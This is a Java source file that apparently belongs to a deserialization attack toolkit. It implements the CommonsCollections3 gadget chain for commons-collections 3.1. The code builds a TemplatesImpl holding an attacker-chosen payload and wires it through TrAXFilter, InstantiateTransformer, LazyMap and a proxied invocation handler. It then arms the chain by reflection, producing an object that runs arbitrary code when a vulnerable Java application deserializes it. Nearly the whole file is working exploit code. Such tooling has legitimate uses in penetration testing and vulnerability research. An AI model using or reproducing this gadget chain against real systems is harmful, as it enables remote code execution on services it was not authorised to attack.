package marshalsec.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import javax.xml.transform.Templates;
import marshalsec.UtilFactory;
import marshalsec.util.Gadgets;
import marshalsec.util.JavaVersion;
import marshalsec.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

/**
 * commons-collections:commons-collections:3.1
 */
public interface CommonsCollections3 extends Gadget {

	default Object makeCommonsCollections3(UtilFactory uf, String[] args) throws Exception {
		Object templatesImpl = Gadgets.createTemplatesImpl(args[0]);

		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(
						new Class[] { Templates.class },
						new Object[] { templatesImpl } )};

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
